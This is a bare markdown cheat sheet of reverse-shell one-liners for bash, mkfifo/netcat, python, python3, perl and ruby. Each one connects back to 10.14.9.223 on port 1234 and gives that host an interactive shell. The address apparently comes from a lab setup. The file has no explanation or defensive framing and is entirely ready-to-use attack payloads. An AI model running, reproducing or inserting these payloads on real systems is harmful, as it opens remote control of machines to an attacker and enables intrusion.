# Bash
- ## `bash -i >& /dev/tcp/10.14.9.223/1234 0>&1`

# mkfifo
- ## 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.9.223 1234 >/tmp/f'

# python
- ## `export RHOST="10.14.9.223";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'`

# python3
- ## `export RHOST="10.14.9.223";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'`

# perl
- ## `perl -e 'use Socket;$i="10.14.9.223";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'`

# ruby
- ## `ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.14.9.223",1234))'`
